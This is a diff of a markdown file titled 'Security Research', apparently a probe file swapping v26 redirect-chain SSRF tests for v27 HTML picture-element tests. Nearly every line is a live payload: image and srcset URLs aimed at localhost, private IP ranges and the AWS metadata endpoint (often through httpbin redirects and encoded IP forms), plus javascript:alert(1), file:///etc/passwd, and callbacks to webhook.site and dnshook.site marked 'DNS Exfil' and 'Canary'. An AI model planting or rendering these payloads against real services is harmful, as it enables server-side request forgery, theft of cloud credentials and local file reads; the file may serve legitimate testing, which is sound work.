@@ -1,98 +1,156 @@
-# Security Research - v26
+# Security Research - v27
 
-## httpbin.org Redirect Chain SSRF Tests
+## Picture Element Deep Dive
 
-Using httpbin.org's redirect-to endpoint to test redirect-based SSRF.
-
----
-
-### 1) Baseline - External Redirect (Should work)
-![ext-redirect](https://httpbin.org/redirect-to?url=https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/external-redir.gif)
+Testing edge cases with `<picture>` element processing.
 
 ---
 
-### 2) Redirect to localhost variants
+### 1) Multiple Sources - Which Gets Fetched?
 
-#### 127.0.0.1
-![redir-127](https://httpbin.org/redirect-to?url=http://127.0.0.1/ssrf.gif)
-
-#### localhost
-![redir-localhost](https://httpbin.org/redirect-to?url=http://localhost/ssrf.gif)
-
-#### 0.0.0.0
-![redir-0](https://httpbin.org/redirect-to?url=http://0.0.0.0/ssrf.gif)
-
----
-
-### 3) Redirect to AWS Metadata
-![redir-meta](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
+<picture>
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source1.gif" media="(min-width: 1200px)">
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source2.gif" media="(min-width: 800px)">
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source3.gif" media="(min-width: 400px)">
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/source4.gif">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback1.gif" alt="multi-source">
+</picture>
 
 ---
 
-### 4) Redirect to RFC1918 ranges
-![redir-10](https://httpbin.org/redirect-to?url=http://10.0.0.1/ssrf.gif)
-![redir-172](https://httpbin.org/redirect-to?url=http://172.16.0.1/ssrf.gif)
-![redir-192](https://httpbin.org/redirect-to?url=http://192.168.1.1/ssrf.gif)
+### 2) Source Without Media Query
+
+<picture>
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/no-media.gif">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback2.gif" alt="no-media">
+</picture>
 
 ---
 
-### 5) Multi-hop redirect chains
+### 3) Picture with type attribute
 
-#### 2 hops to localhost
-![2hop-local](https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=http://127.0.0.1/)
-
-#### 3 hops to metadata
-![3hop-meta](https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=http://169.254.169.254/)
-
----
-
-### 6) URL-encoded redirect targets
-
-#### Double-encoded localhost
-![enc-local](https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%2F)
-
-#### Unicode localhost (ⓛocalhost)
-![unicode-local](https://httpbin.org/redirect-to?url=http://%E2%93%9Bocalhost/)
+<picture>
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/webp-source.gif" type="image/webp">
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/png-source.gif" type="image/png">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback3.gif" alt="type-attr">
+</picture>
 
 ---
 
-### 7) IPv6 localhost via redirect
-![ipv6-local](https://httpbin.org/redirect-to?url=http://[::1]/)
-![ipv6-ffff](https://httpbin.org/redirect-to?url=http://[::ffff:127.0.0.1]/)
+### 4) Srcset with Multiple URLs (density descriptors)
+
+<picture>
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/1x.gif 1x, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/2x.gif 2x, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/3x.gif 3x">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback4.gif" alt="density">
+</picture>
 
 ---
 
-### 8) Decimal/Hex IP via redirect
-![decimal-ip](https://httpbin.org/redirect-to?url=http://2130706433/)
-![hex-ip](https://httpbin.org/redirect-to?url=http://0x7f000001/)
+### 5) Srcset with Width descriptors
+
+<picture>
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/100w.gif 100w, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/200w.gif 200w, https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/400w.gif 400w" sizes="100vw">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/fallback5.gif" alt="width">
+</picture>
 
 ---
 
-### 9) DNS rebinding domains via redirect
-![nip-local](https://httpbin.org/redirect-to?url=http://127.0.0.1.nip.io/)
-![sslip-local](https://httpbin.org/redirect-to?url=http://127.0.0.1.sslip.io/)
+### 6) Picture with Internal IP in Source (SSRF test)
+
+<picture>
+  <source srcset="http://127.0.0.1/picture-ssrf.gif">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/ssrf-fallback.gif" alt="ssrf">
+</picture>
 
 ---
 
-### 10) Protocol downgrade via redirect
-![https-to-http](https://httpbin.org/redirect-to?url=http://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/protocol-downgrade.gif)
+### 7) Mixed External/Internal Sources
+
+<picture>
+  <source srcset="http://169.254.169.254/latest/" media="(min-width: 1200px)">
+  <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/external-source.gif" media="(min-width: 400px)">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/mixed-fallback.gif" alt="mixed">
+</picture>
 
 ---
 
-### 11) Relative redirect (httpbin supports this)
-![relative](https://httpbin.org/relative-redirect/3)
+### 8) Redirect Chain in Picture Source
+
+<picture>
+  <source srcset="https://httpbin.org/redirect-to?url=http://127.0.0.1/redir-ssrf.gif">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/redir-fallback.gif" alt="redir">
+</picture>
 
 ---
 
-### 12) Success Callback
-![success](https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/redirect-chain-success.gif)
+### 9) Picture Source to Metadata via Redirect
 
-### 13) DNS Exfil
-![dns](https://v26-dns.c6cb2ba9-5868-422f-a30e-86133a87aa32.dnshook.site/dns.gif)
-
-### 14) Canary
-![v26-canary](https://webhook.site/c6cb2ba9-5868-422f-a30e-86133a87aa32/v26-canary.gif)
+<picture>
+  <source srcset="https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/meta-fallback.gif" alt="meta">
+</picture>
 
 ---
 
-*v26 - httpbin.org redirect chain SSRF tests*
+### 10) Nested Picture Attempt
+
+<picture>
+  <picture>
+    <source srcset="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-inner.gif">
+    <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-inner-fb.gif" alt="inner">
+  </picture>
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/nested-outer-fb.gif" alt="outer">
+</picture>
+
+---
+
+### 11) Empty/Malformed Picture
+
+<picture>
+  <source srcset="">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/empty-source.gif" alt="empty">
+</picture>
+
+<picture>
+  <source>
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/no-srcset.gif" alt="no-srcset">
+</picture>
+
+---
+
+### 12) JavaScript URL in Srcset
+
+<picture>
+  <source srcset="javascript:alert(1)">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/js-fallback.gif" alt="js">
+</picture>
+
+---
+
+### 13) Data URL in Srcset
+
+<picture>
+  <source srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/data-fallback.gif" alt="data">
+</picture>
+
+---
+
+### 14) File Protocol in Srcset
+
+<picture>
+  <source srcset="file:///etc/passwd">
+  <img src="https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/file-fallback.gif" alt="file">
+</picture>
+
+---
+
+### DNS Exfil
+![dns](https://v27-dns.29e8800b-a898-4775-94c8-c44a8c649ecf.dnshook.site/dns.gif)
+
+### Canary
+![v27-canary](https://webhook.site/29e8800b-a898-4775-94c8-c44a8c649ecf/v27-canary.gif)
+
+---
+
+*v27 - Picture element deep dive*
